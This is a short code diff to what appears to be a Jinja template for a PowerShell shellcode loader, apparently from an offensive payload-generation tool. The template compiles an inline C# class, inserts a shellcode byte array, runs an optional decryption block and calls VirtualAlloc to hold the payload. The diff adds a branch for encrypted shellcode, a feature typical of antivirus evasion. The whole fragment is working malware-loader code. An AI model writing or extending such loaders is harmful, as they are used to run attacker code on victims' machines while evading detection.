@@ -14,7 +14,11 @@ public class {{ classname }} {
 
 Add-Type $_code
 
+{% if is_encrypted %}
+[byte[]]$enc = {{ shellcode }}
+{% else %}
 [byte[]]$buf = {{ shellcode }}
+{% endif %}
 {{ decrypt_block }}
 
 $addr = [{{ classname }}]::VirtualAlloc(0, $buf.Length, 0x3000, 0x04)
